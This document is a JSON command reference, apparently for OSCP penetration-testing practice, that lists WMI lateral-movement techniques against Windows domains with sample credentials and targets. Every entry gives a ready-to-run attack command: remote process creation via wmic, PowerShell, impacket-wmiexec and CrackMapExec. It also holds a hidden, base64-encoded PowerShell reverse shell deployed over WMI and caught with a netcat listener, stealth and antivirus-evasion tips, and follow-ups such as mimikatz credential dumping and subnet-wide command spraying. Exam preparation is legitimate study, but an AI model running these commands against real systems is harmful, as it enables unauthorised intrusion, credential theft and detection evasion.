{"commands": [{"id": "wmi-legacy-wmic", "name": "WMI - Legacy wmic Command (Deprecated)", "description": "Execute commands on remote Windows system using deprecated wmic utility (RPC port 135 + high port 19152-65535)", "command": "wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create \"<COMMAND>\"", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP or hostname", "example": "192.168.50.73", "required": true}, {"name": "<USER>", "description": "Domain user with local admin rights", "example": "corp\\jen", "required": true}, {"name": "<PASS>", "description": "User password", "example": "Nexus123!", "required": true}, {"name": "<COMMAND>", "description": "Command to execute remotely (runs in Session 0)", "example": "calc", "required": true}], "tags": ["oscp", "wmi", "wmic", "lateral-movement", "active-directory", "windows", "deprecated", "oscp:high"], "prerequisites": ["RPC port 135 open on target", "High-range ports 19152-65535 allowed through firewall"], "alternatives": ["wmi-invoke-method", "wmi-new-cimsession", "wmi-impacket-exec"], "next_steps": ["Upgrade to reverse shell", "Use wmi-powershell-revshell for callback"], "flag_explanations": {"/node:<TARGET>": "Specifies remote computer name or IP address", "/user:<USER>": "Domain\\username or username for authentication", "/password:<PASS>": "Password for authentication (cleartext)", "process call create": "WMI method to spawn new process remotely"}, "success_indicators": ["ReturnValue = 0", "ProcessId = ", "Method execution successful"], "failure_indicators": ["Access is denied", "RPC server is unavailable", "Invalid credentials"], "troubleshooting": {"RPC server is unavailable": "Verify port 135 open: nmap -p 135 -Pn -sV <TARGET>", "Access is denied": "User needs local admin rights. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS>", "Invalid credentials": "Test credentials first: crackmapexec smb <TARGET> -u <USER> -p <PASS>"}, "notes": "EDUCATIONAL CONTEXT: wmic.exe has been deprecated by Microsoft but remains exam-relevant. Processes spawn in Session 0 (system services) meaning GUI applications won't be visible to logged-in users. WHY THIS WORKS: WMI Provider Host runs as SYSTEM, so any process created inherits Session 0. MANUAL ALTERNATIVE: Use Get-WmiObject in PowerShell - same underlying WMI API. TIME ESTIMATE: 2-3 minutes including verification.", "oscp_relevance": "high"}, {"id": "wmi-invoke-method", "name": "WMI - PowerShell Invoke-WmiMethod", "description": "Execute commands remotely using PowerShell Invoke-WmiMethod with Win32_Process class", "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '<COMMAND>' -ComputerName <TARGET> -Credential $credential", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP or hostname", "example": "192.168.50.73", "required": true}, {"name": "<USER>", "description": "Domain\\username with admin rights", "example": "corp\\jen", "required": true}, {"name": "<PASS>", "description": "User password", "example": "Nexus123!", "required": true}, {"name": "<COMMAND>", "description": "Command to execute (PowerShell one-liner or binary)", "example": "calc", "required": true}], "tags": ["oscp", "wmi", "powershell", "lateral-movement", "active-directory", "windows", "invoke-wmimethod", "oscp:high"], "prerequisites": [], "alternatives": ["wmi-new-cimsession", "wmi-impacket-exec", "wmi-legacy-wmic"], "next_steps": ["Use base64-encode-powershell for reverse shell", "Verify execution with Get-Process on target"], "flag_explanations": {"-Class Win32_Process": "WMI class that manages processes", "-Name Create": "WMI method to spawn new process", "-ArgumentList": "Command string passed to Create method", "-ComputerName": "Remote target hostname or IP", "-Credential": "PSCredential object containing username/password"}, "success_indicators": ["ReturnValue : 0", "ProcessId : ", "__GENUS : 2"], "failure_indicators": ["Access is denied", "The RPC server is unavailable", "You cannot call a method on a null-valued expression"], "troubleshooting": {"Access is denied": "Verify admin access: Get-WmiObject -Class Win32_ComputerSystem -ComputerName <TARGET> -Credential $credential", "RPC server unavailable": "Check firewall allows RPC: Test-NetConnection <TARGET> -Port 135", "Null-valued expression": "Ensure PSCredential object created successfully: $credential | Get-Member"}, "notes": "EDUCATIONAL CONTEXT: Modern PowerShell equivalent of wmic. WHY THIS WORKS: Invoke-WmiMethod uses DCOM protocol over RPC (port 135) to communicate with remote WMI service. MANUAL DISCOVERY: Use Get-WmiObject to enumerate Win32_Process class first to understand available methods. UAC BYPASS: Domain users bypass UAC remote restrictions (different than local accounts). TIME ESTIMATE: 3-5 minutes for setup and execution.", "oscp_relevance": "high"}, {"id": "wmi-new-cimsession", "name": "WMI - PowerShell New-CimSession", "description": "Create CIM session over DCOM protocol and execute commands via Invoke-CimMethod", "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName <TARGET> -Credential $credential -SessionOption $options; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<COMMAND>'}", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP or hostname", "example": "192.168.50.73", "required": true}, {"name": "<USER>", "description": "Domain\\username", "example": "corp\\jen", "required": true}, {"name": "<PASS>", "description": "Password", "example": "Nexus123!", "required": true}, {"name": "<COMMAND>", "description": "Command to execute (full PowerShell command or binary path)", "example": "powershell -nop -w hidden -e <BASE64_PAYLOAD>", "required": true}], "tags": ["oscp", "wmi", "cim", "powershell", "lateral-movement", "active-directory", "windows", "oscp:high"], "prerequisites": ["DCOM enabled on target (default)"], "alternatives": ["wmi-invoke-method", "wmi-impacket-exec"], "next_steps": ["Set up reverse shell listener", "Use base64-encode-powershell for payload encoding"], "flag_explanations": {"New-CimSessionOption -Protocol DCOM": "Specifies DCOM as transport (legacy WMI protocol)", "New-CimSession": "Creates persistent session to remote WMI service", "-SessionOption": "Applies DCOM protocol configuration", "Invoke-CimMethod": "Executes WMI method on established session", "-ClassName Win32_Process": "Target WMI class for process creation", "-MethodName Create": "WMI method to spawn process", "-Arguments @{CommandLine=''}": "Hash table with command parameters"}, "success_indicators": ["ProcessId", "ReturnValue : 0", "PSComputerName"], "failure_indicators": ["Access denied", "WinRM cannot process the request", "The user name or password is incorrect"], "troubleshooting": {"Access denied": "Test session creation: Test-WSMan -ComputerName <TARGET> -Credential $credential", "WinRM error": "This uses DCOM not WinRM - ensure port 135 open not 5985", "Session creation fails": "Verify credentials: Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName <TARGET> -Credential $credential"}, "notes": "EDUCATIONAL CONTEXT: CIM (Common Information Model) is modern successor to WMI but can use legacy DCOM protocol. WHY DCOM: New-CimSessionOption -Protocol DCOM ensures compatibility with older Windows systems and bypasses WinRM requirements. BEHIND THE SCENES: CimSession creates persistent connection reducing overhead for multiple commands. STEALTH: Less logging than WinRM - no WinRM event logs generated. TIME ESTIMATE: 2-4 minutes for session creation and command execution.", "oscp_relevance": "high"}, {"id": "wmi-impacket-exec", "name": "WMI - Impacket wmiexec (Kali)", "description": "Semi-interactive shell via WMI from Kali using impacket-wmiexec (executes commands through WMI without touching disk)", "command": "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<DOMAIN>", "description": "Domain name", "example": "corp.com", "required": true}, {"name": "<USER>", "description": "Username with admin rights", "example": "jen", "required": true}, {"name": "<PASS>", "description": "Password or NTLM hash with -hashes format", "example": "Nexus123!", "required": true}, {"name": "<TARGET>", "description": "Target IP", "example": "192.168.50.73", "required": true}], "tags": ["oscp", "wmi", "impacket", "lateral-movement", "active-directory", "kali", "fileless", "oscp:high"], "prerequisites": ["Impacket installed on Kali (pre-installed on OSCP lab)", "SMB connection to target (port 445)"], "alternatives": ["psexec-impacket-shell", "smbexec-impacket-fileless", "evil-winrm-shell"], "next_steps": ["Execute commands as SYSTEM", "Dump credentials with mimikatz", "Enumerate further with PowerShell"], "flag_explanations": {"-hashes :NTLM": "Pass-the-hash with NTLM hash (no password needed)", "-shell-type powershell": "Use PowerShell instead of cmd.exe", "-codec utf-8": "Set character encoding for special characters", "-nooutput": "Don't retrieve command output (faster execution)"}, "success_indicators": ["[*] SMBv3.0 dialect used", "[!] Launching semi-interactive shell", "C:\\>"], "failure_indicators": ["[-] SMB SessionError", "STATUS_LOGON_FAILURE", "STATUS_ACCESS_DENIED"], "troubleshooting": {"STATUS_LOGON_FAILURE": "Invalid credentials. Test with: crackmapexec smb <TARGET> -u <USER> -p <PASS>", "Connection timeout": "Firewall blocking SMB/RPC. Check ports: sudo nmap -p 135,445 -Pn -v <TARGET>", "STATUS_ACCESS_DENIED": "User not local admin. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS> --local-auth"}, "notes": "EDUCATIONAL CONTEXT: Impacket's wmiexec provides semi-interactive shell from Linux to Windows via WMI. WHY FILELESS: No binaries written to disk - all execution through WMI provider. MANUAL ALTERNATIVE: Each command is converted to WMI Win32_Process.Create call. HOW IT WORKS: Creates temp share, executes command via WMI, retrieves output via share, deletes share. STEALTH: More stealthy than PSExec (no service creation). TIME ESTIMATE: 1-2 minutes for connection establishment. EXAM TIP: Preferred over PSExec when antivirus detection is concern.", "oscp_relevance": "high"}, {"id": "wmi-cme-exec", "name": "WMI - CrackMapExec Command Execution", "description": "Execute single command on remote Windows via WMI using CrackMapExec", "command": "crackmapexec smb <TARGET> -u <USER> -p <PASS> -x '<COMMAND>'", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP or hostname", "example": "192.168.50.73", "required": true}, {"name": "<USER>", "description": "Username", "example": "jen", "required": true}, {"name": "<PASS>", "description": "Password or use -H for NTLM hash", "example": "Nexus123!", "required": true}, {"name": "<COMMAND>", "description": "Command to execute (cmd.exe syntax)", "example": "whoami", "required": true}], "tags": ["oscp", "wmi", "crackmapexec", "cme", "lateral-movement", "active-directory", "kali", "oscp:high"], "prerequisites": ["CrackMapExec installed"], "alternatives": ["wmi-impacket-exec", "cme-winrm-exec"], "next_steps": ["Use -X for PowerShell commands", "Spray command across subnet with CIDR notation"], "flag_explanations": {"-x '<COMMAND>'": "Execute cmd.exe command via WMI", "-X '<COMMAND>'": "Execute PowerShell command via WMI", "-H <NTLM>": "Use NTLM hash for pass-the-hash", "--exec-method wmiexec": "Explicitly specify WMI execution (default)", "-d <DOMAIN>": "Specify domain for authentication"}, "success_indicators": ["[+] Executing command", "[*] Executed command via wmiexec", "Command output displayed"], "failure_indicators": ["[-] Authentication failed", "[-] Connection error", "STATUS_ACCESS_DENIED"], "troubleshooting": {"Authentication failed": "Try with domain: crackmapexec smb <TARGET> -d <DOMAIN> -u <USER> -p <PASS>", "Connection error": "Verify SMB open: crackmapexec smb <TARGET>", "No output shown": "Command may still execute - verify on target system"}, "notes": "EDUCATIONAL CONTEXT: CrackMapExec wraps Impacket for rapid command execution. WHY USE CME: Supports subnet spraying (192.168.50.0/24), multiple hosts in single command. BEHIND THE SCENES: Uses wmiexec execution method by default. COMPARISON: -x for cmd.exe, -X for PowerShell, choose based on command type. TIME ESTIMATE: <1 minute for single command. EXAM TIP: Quick way to test command execution across multiple hosts.", "oscp_relevance": "high"}, {"id": "wmi-powershell-revshell", "name": "WMI - PowerShell Reverse Shell", "description": "Deploy base64-encoded PowerShell reverse shell via WMI for callback to attacker", "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $options = New-CimSessionOption -Protocol DCOM; $session = New-CimSession -ComputerName <TARGET> -Credential $credential -SessionOption $options; $command = 'powershell -nop -w hidden -e <BASE64_PAYLOAD>'; Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP", "example": "192.168.50.73", "required": true}, {"name": "<USER>", "description": "Domain\\username", "example": "corp\\jen", "required": true}, {"name": "<PASS>", "description": "Password", "example": "Nexus123!", "required": true}, {"name": "<BASE64_PAYLOAD>", "description": "Base64-encoded PowerShell reverse shell (use base64-encode-powershell)", "example": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...", "required": true}], "tags": ["oscp", "wmi", "powershell", "reverse-shell", "lateral-movement", "active-directory", "windows", "oscp:high"], "prerequisites": ["base64-encode-powershell to generate payload", "Netcat listener on Kali: nc -lvnp 443"], "alternatives": ["wmi-impacket-exec with manual shell", "winrm-invoke-revshell"], "next_steps": ["Catch shell with: nc -lvnp <LPORT>", "Upgrade to Meterpreter if needed", "Enumerate target with PowerShell"], "flag_explanations": {"-nop": "No profile - don't load PowerShell profiles (faster/stealthy)", "-w hidden": "Hidden window - no visible PowerShell window", "-e <BASE64>": "Encoded command - executes base64 payload", "CommandLine=$command": "Full command string passed to WMI process creation"}, "success_indicators": ["ProcessId : ", "ReturnValue : 0", "Netcat listener receives connection"], "failure_indicators": ["Access is denied", "The system cannot find the file specified", "No connection received on listener"], "troubleshooting": {"No connection received": "Verify LHOST/LPORT in encoded payload match listener", "Payload fails to execute": "Test decoding: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))", "Access denied": "Ensure user has admin rights: crackmapexec smb <TARGET> -u <USER> -p <PASS>", "Firewall blocking callback": "Test outbound connectivity from target first"}, "notes": "EDUCATIONAL CONTEXT: Combines WMI lateral movement with PowerShell reverse shell for full interactive access. WHY BASE64: Avoids escaping issues with special characters in PowerShell one-liner. HOW TO GENERATE: Use base64-encode-powershell command or Python script from module. STEALTH CONSIDERATIONS: Runs in Session 0 (system context), encoded to avoid AV signature detection. MANUAL DECODE: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>')). TIME ESTIMATE: 3-5 minutes including payload generation. EXAM TIP: Pre-generate payloads before exam for various LHOST/LPORT combinations.", "oscp_relevance": "high"}, {"id": "wmi-verify-enabled", "name": "WMI - Verify Service Enabled", "description": "Verify WMI service is running and accessible on remote target", "command": "Get-WmiObject -Class Win32_OperatingSystem -ComputerName <TARGET> -Credential (Get-Credential)", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP or hostname", "example": "192.168.50.73", "required": true}], "tags": ["oscp", "wmi", "verification", "enumeration", "active-directory", "windows"], "prerequisites": [], "alternatives": ["Test-WSMan for WinRM testing"], "next_steps": ["If successful, proceed with wmi-new-cimsession", "If fails, check firewall and RPC connectivity"], "flag_explanations": {"-Class Win32_OperatingSystem": "WMI class that exists on all Windows systems", "-ComputerName": "Target system to query", "-Credential": "Prompts for credentials interactively"}, "success_indicators": ["SystemDirectory : C:\\Windows\\system32", "BuildNumber : ", "Caption : Microsoft Windows"], "failure_indicators": ["The RPC server is unavailable", "Access is denied", "WMI: Not Found"], "troubleshooting": {"RPC server unavailable": "Check port 135: Test-NetConnection <TARGET> -Port 135", "Access denied": "Test credentials: crackmapexec smb <TARGET> -u <USER> -p <PASS>", "Timeout": "Firewall likely blocking WMI/RPC ports"}, "notes": "EDUCATIONAL CONTEXT: Quick test to verify WMI accessibility before attempting lateral movement. WHY WIN32_OPERATINGSYSTEM: Lightweight query that exists on all Windows versions. ALTERNATIVE TEST: wmic /node:<TARGET> /user:<USER> os get caption (from cmd.exe). FIREWALL REQUIREMENTS: Needs RPC port 135 and high-range dynamic ports. TIME ESTIMATE: <1 minute for verification.", "oscp_relevance": "medium"}]}